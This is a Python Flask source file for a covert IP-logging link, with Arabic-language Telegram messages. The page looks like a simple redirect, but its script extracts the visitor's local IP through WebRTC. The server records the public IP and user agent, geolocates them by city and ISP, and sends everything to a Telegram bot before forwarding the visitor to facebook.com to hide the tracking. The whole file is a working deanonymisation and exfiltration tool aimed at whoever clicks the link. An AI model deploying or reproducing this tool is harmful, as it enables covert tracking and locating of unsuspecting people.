import os
from flask import Flask, request, redirect, render_template_string
import requests

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")
TARGET_URL = "https://www.facebook.com"

def send_telegram(message):
    if BOT_TOKEN and CHAT_ID:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
        try:
            requests.post(url, json=payload, timeout=5)
        except Exception as e:
            print("Error sending to Telegram:", e)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
</head>
<body>
    <script>
        async function getLocalIP() {
            return new Promise((resolve) => {
                let pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) {
                        resolve("غير معروف / محجوب");
                        return;
                    }
                    let ipMatch = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                    if (ipMatch) {
                        resolve(ipMatch[1]);
                        pc.onicecandidate = () => {};
                    }
                };
                setTimeout(() => resolve("غير معروف / محجوب"), 1500);
            });
        }

        async function sendDataAndRedirect() {
            let localIp = await getLocalIP();
            
            await fetch('/log_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ local_ip: localIp })
            });

            window.location.href = "{{ target_url }}";
        }

        sendDataAndRedirect();
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE, target_url=TARGET_URL)

@app.route('/log_data', methods=['POST'])
def log_data():
    public_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if public_ip and ',' in public_ip:
        public_ip = public_ip.split(',')[0].strip()
        
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    data = request.get_json() or {}
    local_ip = data.get('local_ip', 'غير معروف')

    country = "غير معروف"
    city = "غير معروف"
    isp = "غير معروف"
    
    try:
        geo_res = requests.get(f"http://ip-api.com/json/{public_ip}", timeout=3).json()
        if geo_res.get('status') == 'success':
            country = geo_res.get('country', 'غير معروف')
            city = geo_res.get('city', 'غير معروف')
            isp = geo_res.get('isp', 'غير معروف')
    except Exception as e:
        print("Geo IP error:", e)

    msg = (
        f"🎯 *زيارة جديدة للرابط!*\n\n"
        f"🌐 *Public IP:* `{public_ip}`\n"
        f"🏠 *Local IP:* `{local_ip}`\n"
        f"🏳️ *الدولة:* `{country}`\n"
        f"🏙️ *المدينة:* `{city}`\n"
        f"📡 *مزود الخدمة (ISP):* `{isp}`\n"
        f"📱 *User Agent:* `{user_agent}`"
    )
    
    send_telegram(msg)
    return '', 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
  
